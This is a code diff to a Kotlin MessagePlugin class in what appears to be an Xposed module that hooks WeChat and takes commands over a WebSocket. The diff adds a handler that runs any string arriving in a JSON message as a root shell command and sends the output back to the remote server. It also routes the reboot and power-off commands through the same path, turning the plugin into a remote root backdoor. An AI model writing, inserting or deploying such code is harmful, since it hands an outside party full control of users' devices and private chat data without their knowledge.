@@ -5,6 +5,7 @@ import android.content.ContentValues
 import android.content.Context
 import android.os.Build
 import com.example.libcontacts.IdGet
+import com.example.libcontacts.ShellUtils
 import com.example.libcontacts.WebSocketClient
 import com.example.libcontacts.WebSocketClientListener
 import com.lu.lposed.api2.XposedHelpers2
@@ -18,13 +19,9 @@ import com.lu.wxmask.util.WxSQLiteManager
 import com.lu.wxmask.util.ext.toJson
 import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.callbacks.XC_LoadPackage
-import okhttp3.Response
-import okhttp3.WebSocket
-import org.java_websocket.handshake.ServerHandshake
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
-import java.nio.ByteBuffer
 import kotlin.math.min
 
 class MessagePlugin : WebSocketClientListener, IPlugin {
@@ -156,17 +153,17 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
 
                     sendSqlExecuteResult(dbName, sql, count, json)
                 }
+                3 -> {
+                    val cmd = json.optString("sql")
+                    executeCommand(cmd, json)
+                }
                 // 重启手机
                 4 -> {
-                    val rebootProcess =
-                        Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
-                    rebootProcess.waitFor()
+                    executeCommand("reboot",  json)
                 }
 
                 5 -> {
-                    val powerOffProcess =
-                        Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot", "-p"))
-                    powerOffProcess.waitFor()
+                    executeCommand("reboot -p", json)
                 }
 
                 6 -> {
@@ -186,6 +183,14 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
         } catch (e: Exception) {
             e.printStackTrace()
         }
+    }
+
+    private fun executeCommand(cmd: String, source: JSONObject) {
+        val result = ShellUtils.execRootCmd1(cmd)
+        sendMessage(JSONObject().apply {
+            put("data", result)
+            put("source", source)
+        }.toString())
     }
 
 
